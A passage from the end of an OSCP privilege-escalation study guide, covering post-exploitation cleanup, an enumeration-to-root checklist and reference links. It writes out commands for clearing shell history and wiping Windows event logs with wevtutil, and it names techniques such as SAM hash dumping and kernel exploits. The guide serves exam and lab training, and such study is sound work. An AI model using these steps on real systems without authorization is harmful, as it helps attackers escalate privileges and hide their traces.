## Phase 5: Post-Exploitation Cleanup Tips

Cleaning up is important, especially in real environments or when
practicing in labs (so you can reset for another attempt). In the OSCP
exam, machines revert after you finish, so cleanup is not strictly
required, but it\'s good practice and shows professionalism.

-   **Remove any backdoor binaries or scripts** you added. For example,
    if you created `/tmp/rootbash` via a cron job exploit, delete it
    after use: `rm -f /tmp/rootbash`. If you placed a malicious DLL or
    EXE, remove it or restore the original file. This prevents
    accidental damage or detection by others.

-   **Restore original file permissions/config** if you modified them.
    For instance, if you edited a cron file or registry setting for
    exploitation, consider putting back the original content (if known)
    or at least note what was changed. In exam conditions, this might
    not matter, but in a corporate engagement, leaving a system in a
    stable state is key.

-   **Remove user accounts or credentials** you created. If you added a
    user to /etc/passwd or Windows Administrators, remove that user when
    it\'s no longer needed. E.g., `userdel hacker` on Linux or
    `net user hacker /del` on Windows after finishing your work (if it's
    a long-term engagement, maybe leave it for persistence if
    authorized, but in OSCP assume you should tidy up).

-   **Clear command history and sensitive logs:**\
    On Linux, `history -c` can clear your shell history (also remove
    `~/.bash_history` entries). Check `/var/log/auth.log` or
    `bash_history` of the user for traces of your commands, if you care
    to (though on exam machines it\'s fine). On Windows, your activities
    might be logged in Event Viewer (Security log for service changes,
    etc.). You could clear logs with `wevtutil` commands if you had
    admin, but be cautious -- log clearing is extremely noisy and
    suspicious. Probably overkill for OSCP practice, but know the
    command: `wevtutil cl System` (for example) clears the System log.

-   **Close any backdoors/ports** opened. If you started a listener or a
    reverse shell is still active, terminate it gracefully. For
    instance, if you enabled RDP by adding a user, maybe disable that
    user or turn RDP off (again, more relevant to real scenarios).

Cleaning up ensures that if you revisit this machine or someone else
does, they get a pristine experience. It also prevents other students
(in labs) from exploiting the leftover artifacts to get unintended
access.

Finally, let\'s compile everything into a concise checklist you can use
during exam prep or the exam itself.

## Final Enumeration-to-Root Checklist

Use this checklist as a quick-reference during your OSCP practice or
exam to make sure you\'ve covered common ground. It's organized in the
rough order you might attempt them. Check items off as you enumerate and
exploit.

-   \[ \] **Initial Enumeration:** Gather basic info (user, OS, kernel)
    and quick wins. Run `whoami`, `id`/`whoami /priv`,
    `uname -a`/`systeminfo`[\[3\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Initial%20Enumeration%20%28First%2015%20minutes%29,Review%20network%20configuration).
    Note any obvious misconfig (sudo rights, special group membership,
    unquoted service, etc.). Start an enumeration script
    (linPEAS/winPEAS) in the
    background[\[3\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Initial%20Enumeration%20%28First%2015%20minutes%29,Review%20network%20configuration)
    for hints while you manually proceed.

-   \[ \] **Quick Wins (15 mins):**

-   Linux: Check
    `sudo -l`[\[5\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Sudo%20allows%20specific%20commands%20to,be%20run%20with%20elevated%20privileges)
    for NOPASSWD and exploit immediately if found (GTFOBins). Search for
    SUID
    files[\[13\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=SUID%20,regardless%20of%20who%20executes%20them)
    and note interesting ones. Look for world-writable cron jobs or
    config
    files[\[12\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Quick%20Wins%20Check%20,Check%20for%20common%20credentials%20files).

-   Windows: Check for high-value privileges (`SeImpersonate`,
    `SeBackup`)[\[24\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Windows%20tokens%20represent%20security%20context,and%20can%20sometimes%20be%20impersonated)[\[25\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=SeBackupPrivilege%3A).
    Look for services with unquoted paths or weak permissions. Query
    AlwaysInstallElevated[\[32\]](https://medium.com/@persecure/windows-privilege-escalation-alwaysinstallelevated-8e83f7d1bbc6#:~:text=We%20can%20manually%20enumerate%20the,by%20querying%20the%20following%20commands).
    List scheduled tasks. These are your prime targets.

-   \[ \] **Deeper Enumeration (next 30+ mins):**

-   Linux: If no quick win, thoroughly search configs for creds
    (`grep -R "password"`). Enumerate all cron jobs, `getcap` for
    capabilities[\[17\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Find%20files%20with%20capabilities,r%20%2F%202%26gt%3B%2Fdev%2Fnull),
    NFS
    exports[\[19\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Network%20File%20System%20,can%20lead%20to%20privilege%20escalation),
    and any unusual group privileges (docker, etc.). Consider running
    `Linux Exploit Suggester` to identify kernel exploits.

-   Windows: Use `accesschk` or PowerUp to find writable services,
    registry auto-run keys, or unattended install files. Dump SAM hashes
    if SeBackupPrivilege
    allows[\[25\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=SeBackupPrivilege%3A).
    Examine installed programs for known exploits (e.g., out-of-date
    software). If not done, run WinPEAS and review its sections
    (especially Services, Apps, Files, and Registry).

-   \[ \] **Choose an Exploit Path:** Based on findings, decide what to
    exploit: e.g., \"Use tar sudo exploit\" or \"Run JuicyPotato\" or
    \"Compile Dirty COW\". If multiple options, pick the most
    reliable/minimally destructive first. Have backup options noted.

-   \[ \] **Exploitation Phase:** Execute your chosen method carefully:

-   For Linux, ensure your syntax is correct (especially with wildcard
    exploits or compiling exploits). Run commands and verify root access
    (`whoami` after exploitation).

-   For Windows, if using a public exploit tool, ensure it\'s the right
    one for OS version. Watch for any output or errors. Check
    `whoami /groups` after to confirm you got SYSTEM or Administrators.

-   \[ \] **Post-exploitation:** Once root/Administrator, *capture the
    flag or proof* as required (usually a text file). Then, if
    applicable, tidy up: remove any files or users you added.

If an exploit fails, **pivot**: go back to your enum notes and try the
next thing. Keep an eye on time; don\'t let one approach consume too
long if you have alternatives.

Remember, practice these techniques on many machines so the process
becomes second nature. During the exam, this guide should serve as a
helpful reminder of commands and steps, but the real skill is adapting
to the specific machine\'s scenario.

Good luck, and happy escalating! 🐱‍💻

**References:** This guide is compiled from numerous community resources
and tools: the **PEASS-ng** project (linPEAS/winPEAS) by
\@carlospolop[\[52\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=4.%20PEASS,and%20WinPEAS%20source%20and%20documentation),
the **GTFOBins** and **LOLBAS** knowledge bases for abusing legitimate
binaries[\[14\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=4.%20PEASS,and%20WinPEAS%20source%20and%20documentation)[\[53\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=6.%20LOLBAS%20Project%20,the%20land%20binaries%20for%20Windows),
the comprehensive **Total OSCP Guide by
sushant747**[\[54\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=2,Comprehensive%20Linux%20privesc%20techniques),
**HackTricks** privilege escalation
tactics[\[55\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=3.%20HackTricks%20,Modern%20privilege%20escalation%20techniques),
**TJ Null's OSCP prep advice**, and various write-ups and experiences
shared by the infosec community. Always ensure you have authorization to
test these techniques, and use them
ethically[\[56\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=This%20guide%20represents%20a%20compilation,engagements%20or%20personal%20lab%20environments).

[\[1\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Privilege%20escalation%20is%20the%20process,Linux%20or%20Administrator%2FSYSTEM%20on%20Windows)
[\[2\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Save%20time%20by%20running%20automated,tools%20while%20doing%20manual%20enumeration)
[\[3\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Initial%20Enumeration%20%28First%2015%20minutes%29,Review%20network%20configuration)
[\[4\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Linux%3Ca%3E%3C%2Fa%3E%20uname%20,User%20ID%20and%20groups)
[\[5\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Sudo%20allows%20specific%20commands%20to,be%20run%20with%20elevated%20privileges)
[\[6\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Automated%20enumeration%20tools%20significantly%20speed,up%20the%20privilege%20escalation%20process)
[\[7\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Interpreting%20LinPEAS%20Output)
[\[8\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Windows,User%20group%20memberships)
[\[9\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=WinPEAS%20is%20the%20Windows%20counterpart,to%20LinPEAS)
[\[10\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=1,patches%2C%20architecture)
[\[11\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=PowerUp%20%28PowerShell%29%3Ca%3E%3C%2Fa%3E%20Import)
[\[12\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Quick%20Wins%20Check%20,Check%20for%20common%20credentials%20files)
[\[13\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=SUID%20,regardless%20of%20who%20executes%20them)
[\[14\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=4.%20PEASS,and%20WinPEAS%20source%20and%20documentation)
[\[15\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Cron%20jobs%20are%20scheduled%20tasks,often%20run%20with%20elevated%20privileges)
[\[16\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Linux%20capabilities%20divide%20root%20privileges,into%20smaller%20units)
[\[17\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Find%20files%20with%20capabilities,r%20%2F%202%26gt%3B%2Fdev%2Fnull)
[\[18\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Common%20dangerous%20capabilities%3A%3Ca%3E%3C%2Fa%3E%20cap_setuid%20,a)
[\[19\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Network%20File%20System%20,can%20lead%20to%20privilege%20escalation)
[\[20\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=On%20attacker%20machine,a)
[\[22\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Kernel%20exploits%20target%20vulnerabilities%20in,the%20Linux%20kernel%20itself)
[\[23\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Dirty%20COW%20%28CVE)
[\[24\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Windows%20tokens%20represent%20security%20context,and%20can%20sometimes%20be%20impersonated)
[\[25\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=SeBackupPrivilege%3A)
[\[26\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Windows%20services%20with%20unquoted%20paths,containing%20spaces%20can%20be%20exploited)
[\[33\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=If%20task%20script%20is%20writable,C%3A%5Cpath%5Cto%5Ctask%5Cscript.bat)
[\[34\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Use%20Process%20Monitor%20to%20identify,AllChecks)
[\[35\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Use%20tools%20like%20JuicyPotato%2C%20PrintSpoofer%2C,c%20cmd)
[\[36\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=find%20Command%20Exploitation%3A)
[\[37\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=nmap%20Exploitation%20%28versions%20)
[\[38\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=vim%2Fvi%20Exploitation%3A)
[\[39\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Create%20malicious%20passwd%20file,cp%20%2Ftmp%2Fpasswd%20%2Fetc%2Fpasswd%20su%20hacker)
[\[40\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Wildcard%20Exploitation%3A)
[\[41\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=If%20sudo%20allows%3A%20%2Fbin%2Fless%20%2Fvar%2Flog%2F,a%3E%20%3A%21%2Fbin%2Fsh)
[\[42\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Environment%20Variable%20Abuse%3A)
[\[43\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=If%20cron%20script%20is%20writable,p)
[\[44\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=echo%20%27,p)
[\[45\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Compile%20and%20run%20dirty%20cow,a)
[\[46\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Overlayfs%20%28CVE)
[\[47\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=echo%20%27int%20main%28%29%7Bsetgid%280%29%3B%20setuid%280%29%3B%20system%28,a%3E%20%2Fpath%2Fto%2Fmounted%2Fx)
[\[51\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=%2F%2F%20malicious,return%20TRUE%3B)
[\[52\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=4.%20PEASS,and%20WinPEAS%20source%20and%20documentation)
[\[53\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=6.%20LOLBAS%20Project%20,the%20land%20binaries%20for%20Windows)
[\[54\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=2,Comprehensive%20Linux%20privesc%20techniques)
[\[55\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=3.%20HackTricks%20,Modern%20privilege%20escalation%20techniques)
[\[56\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=This%20guide%20represents%20a%20compilation,engagements%20or%20personal%20lab%20environments)
OSCP-Complete-Privilege-Escalation-Guide.pdf

<file://file_00000000a3d0620a84e217ba9230a1d3>

[\[21\]](https://medium.com/@kankojoseph/from-containers-to-host-privilege-escalation-techniques-in-docker-487fe2124b8e#:~:text=From%20Containers%20to%20Host%3A%20Privilege,to%20carry%20out%20your)
From Containers to Host: Privilege Escalation Techniques in Docker

<https://medium.com/@kankojoseph/from-containers-to-host-privilege-escalation-techniques-in-docker-487fe2124b8e>

[\[27\]](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html#:~:text=What%20we%20are%20interested%20in,rights)
[\[28\]](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html#:~:text=NT%20AUTHORITY)
[\[29\]](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html#:~:text=We%20then%20compile%20it%20with,mingw%20like%20this)
[\[30\]](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html#:~:text=Restart%20the%20Service)
Privilege Escalation - Windows · Total OSCP Guide

<https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html>

[\[31\]](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/#:~:text=%28AlwaysInstallElevated%29%20www,be%20installed%20with%20administrative%20privileges)
Windows Privilege Escalation (AlwaysInstallElevated)

<https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/>

[\[32\]](https://medium.com/@persecure/windows-privilege-escalation-alwaysinstallelevated-8e83f7d1bbc6#:~:text=We%20can%20manually%20enumerate%20the,by%20querying%20the%20following%20commands)
[\[48\]](https://medium.com/@persecure/windows-privilege-escalation-alwaysinstallelevated-8e83f7d1bbc6#:~:text=To%20establish%20a%20reverse%20shell,can%20accomplish%20this%20using%20msfvenom)
[\[49\]](https://medium.com/@persecure/windows-privilege-escalation-alwaysinstallelevated-8e83f7d1bbc6#:~:text=your%20attacking%20machine,to%20establish%20the%20desired%20connection)
[\[50\]](https://medium.com/@persecure/windows-privilege-escalation-alwaysinstallelevated-8e83f7d1bbc6#:~:text=msfvenom%20,o%20evil.msi)
Windows Privilege Escalation : AlwaysInstallElevated \| by Persecure \|
Medium

<https://medium.com/@persecure/windows-privilege-escalation-alwaysinstallelevated-8e83f7d1bbc6>
